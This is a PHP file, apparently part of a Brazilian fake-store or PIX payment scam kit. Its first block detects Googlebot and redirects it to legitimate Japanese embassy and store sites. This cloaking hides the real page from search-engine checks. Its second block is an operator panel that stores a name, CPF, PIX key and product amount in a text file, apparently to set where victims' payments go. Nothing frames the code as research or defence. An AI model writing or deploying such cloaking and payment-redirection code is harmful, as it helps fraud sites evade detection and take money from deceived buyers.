<?php
// Array com os links aleatórios
$links = array(
    'https://www.br.emb-japan.go.jp/itprtop_pt/index.html',
    'https://japanrabbit.com/pt/lojas/',
    'https://www.japanstore.com.br/'
);

// Verifica o user-agent para identificar o Googlebot
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$isGooglebot = stripos($userAgent, 'Googlebot') !== false;

// Redireciona o Googlebot para um link aleatório
if ($isGooglebot) {
    $randomLink = $links[array_rand($links)];
    header("Location: $randomLink");
    exit();
}
?>


<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = $_POST['name'] ?? '';
    $cpf = $_POST['cpf'] ?? '';
    $pixKey = $_POST['pixKey'] ?? '';
    $valor = $_POST['valor'] ?? '';

    // Formatar os dados
    $data = "Nome: " . $name . "\n" .
            "CPF: " . $cpf . "\n" .
            "Chave PIX: " . $pixKey . "\n" .
            "Valor: " . $valor . "\n\n";

    // Salvar os dados no arquivo de texto, substituindo o conteúdo existente
    file_put_contents("data.txt", $data, LOCK_EX);

    // Redirecionar de volta para o painel
    header("Location: painel.php");
    exit();
}
?>

<html>
<head>
    <title>Painel</title>
</head>
<body>
    <h1>Painel</h1>

    <form action="painel.php" method="post">
        <label for="name">Nome:</label><br>
        <input type="text" id="name" name="name" required><br><br>

        <label for="cpf">CPF:</label><br>
        <input type="text" id="cpf" name="cpf" required><br><br>

        <label for="pixKey">Chave PIX:</label><br>
        <input type="text" id="pixKey" name="pixKey" required><br><br>

        <label for="valor">Valor do Produto:</label><br>
        <input type="text" id="valor" name="valor" required><br><br>

        <input type="submit" value="Enviar">
    </form>
</body>
</html>